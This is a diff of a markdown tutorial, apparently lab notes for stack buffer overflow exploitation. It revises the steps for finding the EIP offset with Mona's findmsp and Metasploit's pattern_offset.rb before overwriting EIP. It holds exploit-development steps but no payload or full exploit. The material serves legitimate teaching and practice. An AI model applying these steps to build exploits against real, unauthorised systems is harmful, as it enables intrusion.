@@ -172,19 +172,17 @@ except:
     print("Could not connect.")
 ```
 
-3.	Run the following in Mona and skip 4 (If it doesn't work do step 4 tho as a workaround)
+3.	Get the amound of offset bytes. Run the following in Mona 
 ```
 !mona findmsp -distance <LENGTH OF GENERATED STRING>
-```
 Check for output: EIP contains normal pattern : ... (offset XXXX)
+```
 
-4. Get the amount of offset bytes.
+Or with metasploit
 
 ```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <EIP VALUE>```
 
-```!mona po <EIP VALUE>```
-
-5. Update your exploit.py script and set the offset variable to this value (was previously set to 0). 
+4. Update your exploit.py script and set the offset variable to this value (was previously set to 0). 
 
 #### Overwriting the EIP
 1. Set the payload variable to an empty string again. Set the retn variable to "BBBB".
